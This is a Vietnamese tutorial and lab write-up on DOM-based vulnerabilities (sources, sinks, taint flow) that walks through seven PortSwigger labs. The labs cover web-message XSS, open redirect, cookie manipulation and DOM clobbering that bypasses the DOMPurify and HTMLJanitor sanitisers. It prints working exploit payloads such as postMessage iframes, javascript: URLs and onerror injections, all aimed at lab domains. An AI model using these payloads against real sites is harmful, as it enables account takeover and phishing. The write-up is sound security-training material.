---
title: 'Web10: DOM-based vulnerabilities'
tags: [web10]

---

**DOM** hay còn gọi là **Document Object Model** là sự trình bày theo cấp bậc của các thành phần trên trang của trình duyệt web. Các trang web có thể sử dụng **Javascript** để thao tác với các nút và đối tượng của **DOM** cũng như các thuộc tính của chúng. Bản thân thao tác **DOM** không phải là một vấn đề. Trên thực tế, nó là một phần không thể thiếu trong cách hoạt động của các trang web hiện đại. Tuy nhiên, **Javascript** xử lý dữ liệu không an toàn có thể kích hoạt nhiều cuộc tấn công khác nhau. Các lỗ hổng dựa trên **DOM** phát sinh khi một trang web chứa **Javascript** lấy giá trị do kẻ tấn công kiểm soát, được gọi là source và chuyển nó vào một chức năng nguy hiểm được gọi là sink.

### Taint-flow là gì?

Để khai thác hoặc giảm thiểu lỗ hổng này trước tiên ta phải tự làm quen với những kiến thức cơ bản về **taint-flow** giữa souce và sink

**Source**  
Nguồn là một thuộc tính **Javascript** chấp nhận dữ liệu có khả năng bị kẻ tấn công kiểm soát.

Một ví dụ về souce hay gặp là thuộc tính **location.search** vì nó đọc đầu vào từ người dùng.

Ngoài ra còn có, url referer được hiển thị bằng **document.referrer** và cookie người dùng **document.cookie** và các tin nhắn web.

**Sink**  
sink là một function **Javascript** hoặc đối tượng **DOM** tiềm ẩn nguy hiểm, có thể gây ra các tác động không mong muốn nếu dữ liệu do kẻ tấn công kiểm soát được truyền tới nó.

Ví dụ:  
hàm eval() là một sink vì nó xử lý các đối số được truyền cho nó dưới dạng **Javascript**.

Một ví dụ về sink HTML là **document.body.innerHTML** vì nó có khả năng cho phép kẻ tấn công chèn HTML độc hại và thực thi **Javascript** tùy ý.

Về cơ bản, các lỗ hổng dựa trên **DOM** phát sinh khi một trang web truyền dữ liệu từ source đến sink.

Souce phổ biến nhất là URL, thường được truy cập bằng location. Kẻ tấn công có thể xây dựng một liên kết để gửi nạn nhân đến một trang dễ bị tấn công với tải trọng trong chuỗi truy vấn và các phần phân đoạn của URL.

Ví dụ:

```
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
location = goto;
}
```

  
=\> Điều này có thể gây ra lỗi open redirect thông qua **DOM** vì source location.hash được xử lý theo cách không an toàn. Nếu URL chứa đoạn băm bắt đầu bằng https:, mã này sẽ trích xuất giá trị của location.hash và đặt nó làm thuộc tính location của thuộc tính window. Kẻ tấn công có thể khai thác lỗ hổng này bằng cách tạo ra URL sau:

```
https://www.innocent-website.com/example#https://www.evil-user.net
```

  
Khi nạn nhân truy cập vào URL này, **Javascript** sẽ đặt giá trị của location thành [https://www.evil-user.net](https://www.evil-user.net/), tự động chuyển hướng nạn nhân đến trang web độc hại. Ví dụ: hành vi này có thể dễ dàng bị khai thác để xây dựng một cuộc tấn công lừa đảo.

### Một số source thông thường

Sau đây là những source điển hình có thể được sử dụng để khai thác nhiều lỗ hổng **taint-flow**

```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

Các loại dữ liệu sau đây có thể được sử dụng để làm source khai thác các lỗ hổng **taint-flow** sau:

```
reflected data
stored data
web messages
```

OK ta đã nắm được các source phổ biến, bây giờ là các sink phổ biến:

```
DOM XSS LABS: document.write()
Open redirection LABS: window.location
Cookie manipulation LABS: document.cookie
JavaScript injection: eval()
Document-domain manipulation: document.domain
WebSocket-URL poisoning: WebSocket()
Link manipulation: element.src
Web message manipulation: postMessage()
Ajax request-header manipulation: setRequestHeader()
Local file-path manipulation: FileReader.readAsText()
Client-side SQL injection: ExecuteSql()
HTML5-storage manipulation: sessionStorage.setItem()
Client-side XPath injection: document.evaluate()
Client-side JSON injection: JSON.parse()
DOM-data manipulation: element.setAttribute()
Denial of service: RegExp()
```

### Cách ngăn chặn các lỗ hổng taint-flow dựa trên DOM

Cách hiệu quả nhất để tránh các lỗ hổng dựa trên **DOM** là tránh cho phép dữ liệu từ bất kỳ nguồn không đáng tin cậy nào tự động thay đổi giá trị được truyền đến bất kỳ hệ thống lưu trữ nào.

Một số lỗ hổng cụ thể
---------------------

### DOM-based XSS

**DOM-based XSS là gì?**

Các lỗ hổng **XSS** dựa trên **DOM** thường phát sinh khi Javascript lấy dữ liệu từ source do kẻ tấn công kiểm soát, chẳng hạn như URL và chuyển dữ liệu đó đến một hệ thống hỗ trợ thực thi mã động, chẳng hạn như eval() hoặc **innerHTML**. Điều này cho phép kẻ tấn công thực thi **Javascript** độc hại, thường cho phép chúng chiếm đoạt tài khoản của người dùng khác.  
Để thực hiện một cuộc tấn công **XSS** dựa trên **DOM**, bạn cần đặt dữ liệu vào một nguồn để nó được truyền đến một sink và thực thi mã **Javascript** tùy ý.

**Khai thác**

Về nguyên tắc một trang web dễ bị tấn công bởi **XSS** dựa trên **DOM** nếu có một đường dẫn thực thi mà qua đó dữ liệu có thể truyền từ source tới sink. Trong thực tế, các source và sink khác nhau có các đặc tính và hành vi khác nhau có thể ảnh hưởng đến khả năng khai thác và xác định những kỹ thuật nào là cần thiết. Ngoài ra, các tập lệnh của trang web có thể thực hiện xác thực hoặc xử lý dữ liệu khác phải được cung cấp khi cố gắng khai thác lỗ hổng. Có nhiều loại sink có liên quan đến các lỗ hổng dựa trên **DOM**.

Ví dụ:  
sink document.write hoạt động với các phần tử script. vì vậy ta có thể sử dụng payload đơn giản sau, chẳng hạn như:

```
document.write('… …');
```

# **1. Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) using web messages**
>This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.
![image](https://hackmd.io/_uploads/rJKCY_WI0.png)

>Truy cập trang chủ thì xuất hiện 1 đoạn script tạo event lắng nghe và lấy trực tiếp web message ghi vào tag có chứa **id="ads"** thông qua **innerHTML**: ![image](https://hackmd.io/_uploads/BJfl5d-IC.png)
```
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

>Có thể thấy, đoạn script trên không có check nguồn cũng như validate message. Như vậy ta có thể dùng hàm **postMessage()** với message là XSS payload `<img src=1 onerror=print()` (Do dùng innerHTML). Để trigger được event trên, ta dùng iframe với nội dung như sau:
>`<iframe src="<LAB-DOMAIN>" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

>Lưu vào exploit-server và thử **View exploit**, ta thấy hàm **print()** đã được kích hoạt thành công: ![image](https://hackmd.io/_uploads/SkH90ObUR.png)

>**"Deliver exploit to victim"** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/Sypz0OZL0.png)

# **2. Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) using web messages and a JavaScript URL**
>This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.
![image](https://hackmd.io/_uploads/rJq5etZ8A.png)

>Tương tự bài trên, ứng dụng tồn tại một script lắng nghe **web message**. Khác với bài trên, message lần này yêu cầu là 1 url phải chứa `http:` hoặc `https:` vì dùng hàm **indexOf;** Đồng thời, nó sẽ được gán vào **location.href** nếu thỏa mãn điều kiện:![image](https://hackmd.io/_uploads/r1vX7YZIR.png)
```
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

Như vậy mình có thể `postMessage()` với message: `javascript:alert("https://test")`. Lúc này, nó thỏa điều kiện check url ở trên vì có chứa` https:`, và vì dùng sink location.href nên có thể trigger các hàm js bằng scheme `javascript:`: 
![image](https://hackmd.io/_uploads/SkJ1rt-LA.png)

>Tạo payload bằng iframe và lưu vào exploit-server. Message cụ thể: `javascript:print('https://test')`
>`<iframe src="https://0ac900aa031716b580e662ac00da003f.web-security-academy.net/"
onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">`

>**View exploit**, ta thấy alert() thành công: ![image](https://hackmd.io/_uploads/SyZVBY-U0.png)

>**"Deliver exploit to victim"** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/SJ8GdYWIR.png)

# **3. Lab: DOM-based open redirection**
>This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.
>![image](https://hackmd.io/_uploads/S1njB3MIA.png)

>Tại chức năng **Back to Blog**, xuất hiện một đoạn xử lí để lấy `returnPath` trước khi trả user về đường dẫn theo `returnPath`: ![image](https://hackmd.io/_uploads/SyBcshzUC.png)

>Cụ thể, nếu như `location` chứa **url=https://...** thì **returnPath** sẽ được set và mình sẽ được trả về chính đường dẫn đó nếu click Back to Blog. Nếu không nó sẽ trả về trang chủ tại /
`<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>`

>Như vậy mình chỉ cần thêm tham số url với đường dẫn exploit-server trên url để chuyển hướng về exploit-server mà ta controll:
>`https://<LAB-ID>.web-security-academy.net/post?postId=2&url=https://exploit-<EXPLOIT-ID>.exploit-server.net/
`

>Thêm tham số url vào trong URL của 1 bài post và tải lại trang: ![image](https://hackmd.io/_uploads/B1hEy6fLR.png)

>Click **Back to blog**, thấy rằng trang web đã chuyển hướng về exploit-server của ta: ![image](https://hackmd.io/_uploads/SJ9wkpGLC.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rkI_yaG80.png)

# **4. Lab: DOM-based cookie manipulation**
>This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages
>![image](https://hackmd.io/_uploads/By3MgTMIA.png)

>Khi xem các post về product thì mình sẽ được set 1 cookie `lastViewedProduct` để lưu đường dẫn của post product vừa xem thông qua `window.location`: ![image](https://hackmd.io/_uploads/SkVGQTzU0.png)
![image](https://hackmd.io/_uploads/rkeB7afUA.png)

>Sau đó, quay lại trang chủ thì thấy 1 đường link **Last viewed product** với đường dẫn được lấy từ chính cookie **lastViewedProduct**. Có vẻ như mình có thể escape và reflected XSS tại đây: ![image](https://hackmd.io/_uploads/rJ9Ym6GU0.png)
![image](https://hackmd.io/_uploads/Byg2mTGLA.png)

>**GET** tới đường dẫn như hình chứa XSS payload để `lastViewProduct` được set: ![image](https://hackmd.io/_uploads/HkhyD6zLC.png)

>Quay lại trang chủ thì thấy mình đã XSS thành công: ![image](https://hackmd.io/_uploads/Sy4-vazUC.png)
![image](https://hackmd.io/_uploads/BywGD6fUR.png)

>Bây giờ chỉ cần tạo iframe query đến post chứa XSS print() payload. Và khi nó load thành công thì quay lại trang chủ để trigger XSS. `window.x=1` ở đây được sử dụng để tránh bị loop load trang chủ:
>`<iframe src="https://LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://LAB-ID.web-security-academy.net';window.x=1;">
`

>Lưu payload vào trong exploir server: ![image](https://hackmd.io/_uploads/B1YKvpG8R.png)

>**"Deliver exploit to victim"** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HJA5w6GU0.png)

# **5. Lab: DOM XSS using web messages and JSON.parse**
>This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function:
>![image](https://hackmd.io/_uploads/Ska6fdS80.png)

>Ứng dụng tạo 1 iframe với src là `d.url` từ web message d sau khi được parse bằng `JSON.parse()` nếu như `d.type=="load-channel"`: ![image](https://hackmd.io/_uploads/B1-WUdr8R.png)
```
                   <script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                    </script>
```

>Như vậy ta có tạo payload như sau với url `javascript:print()` để trigger XSS:
```
var payload = '{"type":"load-channel", "url": "javascript:print()"}'
postMessage(payload)
```

>Test thử trên console và thấy được hàm **print()** được trigger thành công!
>![image](https://hackmd.io/_uploads/rypaUOHLR.png)

>Sử dụng iframe tương tự các bài trên với payload đã tạo và lưu vào exploit-server:
`<iframe src="<LAB-DOMAIN>" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
`
![image](https://hackmd.io/_uploads/rysUPdBIC.png)

>**"Deliver exploit to victim"** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/H1Vuw_HIR.png)

# **6. Exploiting DOM clobbering to enable XSS**
>This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function.
>![image](https://hackmd.io/_uploads/r17eeaHIC.png)

>Truy cập lab thì thấy dưới mỗi post đều có chức năng comment: ![image](https://hackmd.io/_uploads/HkuhbaHL0.png)

>Điều đặc biệt là `HTML is allowed` ở phần body comment, nghĩa là ta có thể thêm code HTML vào trong này. Thử với tag `<h1>`:
>![image](https://hackmd.io/_uploads/SJ4vzaHL0.png)

>Thấy rằng comment đã được render ra thành công! ![image](https://hackmd.io/_uploads/r1n_zaBU0.png)

>Đọc source HTML thì thấy có file `loadCommentsWithDomClobbering.js` để thực hiện load các comments: ![image](https://hackmd.io/_uploads/S1kZX6rLC.png)

>Truy cập vào đọc file JS, ta thấy biến `defaultAvatar` được lấy từ kết quả phép OR giữa `window.defaultAvatar` với `{avatar: '/resources/images/avatarDefault.svg'}`. Sau đó nó sẽ được nối với thuộc tính src của thẻ` <img>` để render avatar. Có thể thấy, đoạn script này dính DOM Clobbering khi mình có thể clobber defaultAvatar object.
```
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
```

>Post comment với body như sau để clobber defaultAvatar object: 
>`<a id=defaultAvatar><a id=defaultAvatar name=avatar href='\"onerror=alert(1)//'>
`

>Ta cần 2 tag `<a>` với cùng `id=defaultAvatar` và `name=avatar` để tạo 1 DOM HTML collection vì ta cần truy xuất 2 level `window.defaultAvatar.avatar`. Đồng thời `href='\"onerror=alert(1)//'` để escape src của tag `<img>` avatar → src sai dẫn đến trigger `onerror`

>Post comment: ![image](https://hackmd.io/_uploads/HJ5jLTSU0.png)

>Tuy nhiên trường href của tag `<a>` đã bị xóa hoàn toàn.
>![image](https://hackmd.io/_uploads/HJ86DTB80.png)

>Đọc kĩ lại source js, có thể thấy ứng dụng dùng **DOMpurify** để sanitize, điều này dẫn tới trường href bị xóa:
>`commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);
`
![image](https://hackmd.io/_uploads/B1xvOpB8C.png)

>Tuy nhiên, có 1 trick dùng cho **DOMPurify** là sử dụng các protocol `cid`, `xmpp`, … tại các thuộc tính url thì nó sẽ không URL encode kí tự ". (Xem tại link). Như vậy khi ta encode " thành` &quot;` thì nó sẽ được decode tại runtime thành " và khi đi qua `DOMPurify.sanitize()` sẽ không bị encode → Sử dụng payload sau với trường href dùng 1 trong các scheme `cid` hay` xmpp`, …>`<a id=defaultAvatar><a id=defaultAvatar name=avatar href=xmpp:&quot;onerror=alert(1)//>
`

>Tiếp theo, gửi payload bằng comment 1 trước để nó clobber defaultAvatar object trước rồi gửi comment 2 bất kì thì avatar của comment 2 bị dính XSS theo payload đã tạo.

>Kết quả, sau khi load lại trang thì `alert(1)` đã được kích hoạt thành công: ![image](https://hackmd.io/_uploads/S1wM9pr8R.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/ry_7q6HLR.png)

# **7. Clobbering DOM attributes to bypass HTML filters**
>This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.
>![image](https://hackmd.io/_uploads/HyIo9pSLA.png)

>Đọc source HTML tại trang các posts thì thấy cái file `loadCommentsWithHtmlJanitor.js` thực hiện load các comments và cả thư viện **HTMLJanitor** để sanitize input của người dùng: ![image](https://hackmd.io/_uploads/ByDB3aSIR.png)

>Trong `loadCommentsWithHtmlJanitor.js`, xuất hiện config các tag và thuộc tính cho phép đối với input nó check. Cụ thể, nó chỉ cho phép sử dụng:
* tag input với các thuộc tính name, type, value
* tag form với thuộc tính id
* các tag i, b, p không được sử dụng thuộc tính nào
![image](https://hackmd.io/_uploads/r1bBT6SUA.png)

>Ví dụ như nội dung body của comment sẽ được clean bởi janitor theo config trên.
>`commentBodyPElement.innerHTML = janitor.clean(comment.body);`

>Ta test thử với comment thỏa mãn config của janitor:
>`<form id=test><input name=button type=button value=Click>`

>Có thể thấy 1 form chứa input button được render tại comment. Tuy nhiên khi dùng các thuộc tính ngoài config trên thì sẽ bị janitor filter đi: ![image](https://hackmd.io/_uploads/SJ34AaSLA.png)


>Nó thực hiện sanitize thông qua hàm `clean()`. Hàm `clean()` sẽ gọi đến `_sanitize()`: ![image](https://hackmd.io/_uploads/S1muCprLR.png)

>Tại hàm `_sanitize()`, nó thực hiện sanitize đến node **firstChild** trước và loop qua các attributes của node, nếu nó không nằm trong whitelist (theo config trên) thì sẽ bị remove
```
 // Sanitize attributes
  for (var a = 0; a < node.attributes.length; a += 1) {
    var attr = node.attributes[a];

    if (shouldRejectAttr(attr, allowedAttrs, node)) {
      node.removeAttribute(attr.name);
      // Shift the array to continue looping.
      a = a - 1;
    }
  }
 // Sanitize children
  this._sanitize(document, node);
```

>Tuy nhiên, mình có thể DOM clobbering thuộc tính `attributes` → `node.attributes.length` bị undefined → các thuộc tính ngoài config sẽ không bị filter. Payload sử dụng như sau:
>`<form id=exp tabindex=1 onfocus=print()><input id=attributes>`

>Bằng cách sử dụng thẻ input là **firstChild** của form và **id=attributes** tại tag `input`, tga sẽ bypass được janitor.

>Comment với payload:![image](https://hackmd.io/_uploads/r1h-y0B8C.png)

>Focus đến comment bằng `#exp` (id của form), sự kiện `onfocus` được trigger → `print()` được gọi thành công: ![image](https://hackmd.io/_uploads/rkcI1RBIR.png)

>Sử dụng iframe để gửi đến nạn nhân đường dẫn và đợi đến khi load comments xong thì tự động focus tới `#exp`: 
>`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?postId=9" onload="setTimeout(()=>this.src=this.src+'#exp',500)">
`
![image](https://hackmd.io/_uploads/S17MxCrLA.png)

>**"Deliver exploit to victim"** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/SJeVe0r8A.png)
